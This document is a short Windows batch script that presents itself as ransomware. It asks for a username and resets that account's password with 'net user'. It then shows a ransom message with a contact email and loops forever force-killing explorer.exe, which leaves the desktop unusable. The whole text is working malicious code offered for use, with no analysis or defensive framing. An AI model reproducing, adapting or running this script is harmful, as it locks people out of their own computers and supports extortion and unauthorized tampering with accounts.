@echo off
title TheEnd
color 4
echo 
PING 127.0.0.1 -n 1 -w 3000 >NUL
color 0a
PING 127.0.0.1 -n 1 -w 3000 >NUL
set /p username=TheEnd:
net user %username% Dendrofil
echo
echo
echo
echo RansomWare enabled, contact me at dendrofil@dendrofil.pl so you can make a deal with the infected owner.
echo
echo
PING 127.0.0.1 -n 1 -w 1500 >NUL
:k
taskkill /f /im explorer.exe
goto k